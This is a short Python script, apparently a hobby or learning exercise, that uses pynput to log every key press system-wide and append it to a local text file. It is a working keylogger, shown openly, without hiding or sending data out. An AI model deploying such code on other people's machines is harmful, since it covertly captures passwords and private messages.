from pynput import keyboard
from datetime import datetime

global last_time
last_time = 0


def when_pressed(key):
    global last_time
    current_time = datetime.timestamp(datetime.now())
    new_line = False
    print(current_time)
    print(last_time)
    print(current_time - last_time)
    if current_time - last_time > 2:
        new_line = True
    try:
        print("Pressed key: {0} ".format(key.char))
        file = open(
            "C:\\Users\\VATAN\\OneDrive\\Masaüstü\\d\\pressed_keys.txt", "a", encoding="utf-8")
        if new_line:
            file.write("\n" + key.char)
        else:
            file.write(key.char)
    except AttributeError:
        print("Pressed key: {0} ".format(key))
        file = open(
            "C:\\Users\\VATAN\\OneDrive\\Masaüstü\\d\\pressed_keys.txt", "a", encoding="utf-8")
        file.write("\n" + str(key) + "\n")
    last_time = current_time


def when_released(key):
    pass


with keyboard.Listener(on_press=when_pressed, on_release=when_released) as listener:
    listener.join()

listener = keyboard.Listener(
    on_press=when_pressed, on_release=when_released)
listener.start()
